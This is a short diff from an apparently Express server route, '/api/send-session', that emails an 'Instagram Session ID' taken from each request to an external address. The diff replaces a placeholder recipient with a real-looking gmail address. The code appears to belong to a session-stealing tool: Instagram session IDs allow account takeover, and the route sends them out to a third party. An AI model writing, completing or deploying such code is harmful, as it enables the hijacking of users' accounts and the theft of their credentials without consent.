@@ -47,7 +47,7 @@ app.post("/api/send-session", (req, res) => {
 
   const mailOptions = {
     from: ` <${process.env.EMAIL_USER}>`,
-    to: "sufi9594@example.com",
+    to: "sufi9594@gmail.com",
     subject: "Instagram Session ID",
     text: `Instagram Session ID: ${sessionId}`,
     html: `<p>Instagram Session ID: <strong>${sessionId}</strong></p>`,
